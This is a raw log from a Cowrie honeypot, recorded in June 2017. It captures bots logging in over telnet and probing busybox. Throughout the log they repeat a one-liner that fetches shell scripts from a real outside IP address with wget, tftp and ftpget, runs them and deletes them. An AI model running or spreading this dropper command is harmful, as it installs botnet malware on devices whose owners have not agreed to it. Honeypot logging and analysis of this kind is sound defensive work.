+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57576,186.137.236.216] Command found: /bin/busybox tftp
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57576,186.137.236.216] Command found: tftp
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57576,186.137.236.216] Command found: /bin/busybox 81c46036tftp
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57560,125.227.194.33] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Not storing duplicate content c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Downloaded URL (http://5.189.171.210/rgt.sh) with SHA-256 c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e to dl/c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt.sh
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Command found: sh /rgt.sh
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Command found: tftp 5.189.171.210 -c get bgr1.sh
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr1.sh
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Command found: sh bgr1.sh
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Command found: tftp -r bgr2.sh -g 5.189.171.210
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr2.sh
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Command found: sh bgr2.sh
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Command found: ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://5.189.171.210/rgt1.sh) with SHA-256 f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd to dl/f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt1.sh
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Command found: sh /rgt1.sh
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Command found: rm -rf /rgt.sh bgr1.sh bgr2.sh /rgt1.sh
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Command found: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Command found: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:05+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57560,125.227.194.33] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /tmp
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /var/run
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /mnt
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /root
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: wget http://5.189.171.210/rgt.sh
+2017-06-15T14:08:05+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Not storing duplicate content c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Downloaded URL (http://5.189.171.210/rgt.sh) with SHA-256 c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e to dl/c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt.sh
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Command found: sh /rgt.sh
+2017-06-15T14:08:06+0000 [HTTPPageDownloader,client] Command found: tftp 5.189.171.210 -c get bgr1.sh
+2017-06-15T14:08:06+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr1.sh
+2017-06-15T14:08:06+0000 [HTTPPageDownloader,client] Command found: sh bgr1.sh
+2017-06-15T14:08:06+0000 [HTTPPageDownloader,client] Command found: tftp -r bgr2.sh -g 5.189.171.210
+2017-06-15T14:08:06+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr2.sh
+2017-06-15T14:08:06+0000 [HTTPPageDownloader,client] Command found: sh bgr2.sh
+2017-06-15T14:08:06+0000 [HTTPPageDownloader,client] Command found: ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh
+2017-06-15T14:08:06+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://5.189.171.210/rgt1.sh) with SHA-256 f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd to dl/f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd
+2017-06-15T14:08:06+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt1.sh
+2017-06-15T14:08:06+0000 [HTTPPageDownloader,client] Command found: sh /rgt1.sh
+2017-06-15T14:08:06+0000 [HTTPPageDownloader,client] Command found: rm -rf /rgt.sh bgr1.sh bgr2.sh /rgt1.sh
+2017-06-15T14:08:06+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:06+0000 [CowrieTelnetTransport,57560,125.227.194.33] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:06+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /tmp
+2017-06-15T14:08:06+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /var/run
+2017-06-15T14:08:06+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /mnt
+2017-06-15T14:08:06+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /root
+2017-06-15T14:08:06+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /
+2017-06-15T14:08:06+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: wget http://5.189.171.210/rgt.sh
+2017-06-15T14:08:06+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:06+0000 [CowrieTelnetTransport,57576,186.137.236.216] CMD:  /bin/busybox dd if=/bin/busybox bs=22 count=1 || /bin/busybox cat /bin/busybox
+2017-06-15T14:08:06+0000 [CowrieTelnetTransport,57576,186.137.236.216] Command found: /bin/busybox dd if=/bin/busybox bs=22 count=1
+2017-06-15T14:08:06+0000 [CowrieTelnetTransport,57576,186.137.236.216] Command found: /bin/busybox cat /bin/busybox
+2017-06-15T14:08:06+0000 [CowrieTelnetTransport,57576,186.137.236.216] Command found: cat /bin/busybox
+2017-06-15T14:08:06+0000 [CowrieTelnetTransport,57560,125.227.194.33] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:06+0000 [HTTPPageDownloader,client] Not storing duplicate content c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:06+0000 [HTTPPageDownloader,client] Downloaded URL (http://5.189.171.210/rgt.sh) with SHA-256 c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e to dl/c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:06+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt.sh
+2017-06-15T14:08:06+0000 [HTTPPageDownloader,client] Command found: sh /rgt.sh
+2017-06-15T14:08:06+0000 [HTTPPageDownloader,client] Command found: tftp 5.189.171.210 -c get bgr1.sh
+2017-06-15T14:08:06+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr1.sh
+2017-06-15T14:08:06+0000 [HTTPPageDownloader,client] Command found: sh bgr1.sh
+2017-06-15T14:08:06+0000 [HTTPPageDownloader,client] Command found: tftp -r bgr2.sh -g 5.189.171.210
+2017-06-15T14:08:06+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr2.sh
+2017-06-15T14:08:06+0000 [HTTPPageDownloader,client] Command found: sh bgr2.sh
+2017-06-15T14:08:06+0000 [HTTPPageDownloader,client] Command found: ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh
+2017-06-15T14:08:07+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://5.189.171.210/rgt1.sh) with SHA-256 f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd to dl/f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd
+2017-06-15T14:08:07+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt1.sh
+2017-06-15T14:08:07+0000 [HTTPPageDownloader,client] Command found: sh /rgt1.sh
+2017-06-15T14:08:07+0000 [HTTPPageDownloader,client] Command found: rm -rf /rgt.sh bgr1.sh bgr2.sh /rgt1.sh
+2017-06-15T14:08:07+0000 [HTTPPageDownloader,client] Command found: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:07+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:07+0000 [CowrieTelnetTransport,57560,125.227.194.33] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:07+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /tmp
+2017-06-15T14:08:07+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /var/run
+2017-06-15T14:08:07+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /mnt
+2017-06-15T14:08:07+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /root
+2017-06-15T14:08:07+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /
+2017-06-15T14:08:07+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: wget http://5.189.171.210/rgt.sh
+2017-06-15T14:08:07+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:07+0000 [CowrieTelnetTransport,57560,125.227.194.33] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:07+0000 [CowrieTelnetTransport,57560,125.227.194.33] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:07+0000 [CowrieTelnetTransport,57560,125.227.194.33] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:07+0000 [HoneyPotSSHTransport,33729,113.195.145.52] connection lost
+2017-06-15T14:08:07+0000 [HoneyPotSSHTransport,33729,113.195.145.52] Connection lost after 5 seconds
+2017-06-15T14:08:07+0000 [CowrieTelnetTransport,57560,125.227.194.33] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:07+0000 [HTTPPageDownloader,client] Not storing duplicate content c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:07+0000 [HTTPPageDownloader,client] Downloaded URL (http://5.189.171.210/rgt.sh) with SHA-256 c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e to dl/c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:07+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt.sh
+2017-06-15T14:08:07+0000 [HTTPPageDownloader,client] Command found: sh /rgt.sh
+2017-06-15T14:08:07+0000 [HTTPPageDownloader,client] Command found: tftp 5.189.171.210 -c get bgr1.sh
+2017-06-15T14:08:07+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr1.sh
+2017-06-15T14:08:07+0000 [HTTPPageDownloader,client] Command found: sh bgr1.sh
+2017-06-15T14:08:07+0000 [HTTPPageDownloader,client] Command found: tftp -r bgr2.sh -g 5.189.171.210
+2017-06-15T14:08:07+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr2.sh
+2017-06-15T14:08:07+0000 [HTTPPageDownloader,client] Command found: sh bgr2.sh
+2017-06-15T14:08:07+0000 [HTTPPageDownloader,client] Command found: ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://5.189.171.210/rgt1.sh) with SHA-256 f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd to dl/f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt1.sh
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: sh /rgt1.sh
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: rm -rf /rgt.sh bgr1.sh bgr2.sh /rgt1.sh
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:08+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:08+0000 [CowrieTelnetTransport,57560,125.227.194.33] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:08+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /tmp
+2017-06-15T14:08:08+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /var/run
+2017-06-15T14:08:08+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /mnt
+2017-06-15T14:08:08+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /root
+2017-06-15T14:08:08+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /
+2017-06-15T14:08:08+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: wget http://5.189.171.210/rgt.sh
+2017-06-15T14:08:08+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:41280 (10.8.41.81:2223) [session: TT57577]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:39401 (10.8.41.81:2223) [session: TT57578]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:37995 (10.8.41.81:2223) [session: TT57579]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:38188 (10.8.41.81:2223) [session: TT57580]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:56143 (10.8.41.81:2223) [session: TT57581]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:39407 (10.8.41.81:2223) [session: TT57582]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:49272 (10.8.41.81:2223) [session: TT57583]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:46990 (10.8.41.81:2223) [session: TT57584]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:56181 (10.8.41.81:2223) [session: TT57585]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:44485 (10.8.41.81:2223) [session: TT57586]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:38304 (10.8.41.81:2223) [session: TT57587]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:55078 (10.8.41.81:2223) [session: TT57588]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:50952 (10.8.41.81:2223) [session: TT57589]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:53064 (10.8.41.81:2223) [session: TT57590]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:38327 (10.8.41.81:2223) [session: TT57591]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:43664 (10.8.41.81:2223) [session: TT57592]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:38431 (10.8.41.81:2223) [session: TT57593]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:38629 (10.8.41.81:2223) [session: TT57594]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:38445 (10.8.41.81:2223) [session: TT57595]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:40479 (10.8.41.81:2223) [session: TT57596]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:54068 (10.8.41.81:2223) [session: TT57597]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:44339 (10.8.41.81:2223) [session: TT57598]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:38733 (10.8.41.81:2223) [session: TT57599]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:41283 (10.8.41.81:2223) [session: TT57600]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:40014 (10.8.41.81:2223) [session: TT57601]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:38821 (10.8.41.81:2223) [session: TT57602]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:52197 (10.8.41.81:2223) [session: TT57603]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:38847 (10.8.41.81:2223) [session: TT57604]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:38935 (10.8.41.81:2223) [session: TT57605]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:49324 (10.8.41.81:2223) [session: TT57606]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:38974 (10.8.41.81:2223) [session: TT57607]
+2017-06-15T14:08:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 51.15.49.199:55212 (10.8.41.81:2223) [session: TT57608]
+2017-06-15T14:08:08+0000 [CowrieTelnetTransport,57560,125.227.194.33] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Not storing duplicate content c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Downloaded URL (http://5.189.171.210/rgt.sh) with SHA-256 c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e to dl/c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt.sh
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: sh /rgt.sh
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: tftp 5.189.171.210 -c get bgr1.sh
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr1.sh
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: sh bgr1.sh
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: tftp -r bgr2.sh -g 5.189.171.210
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr2.sh
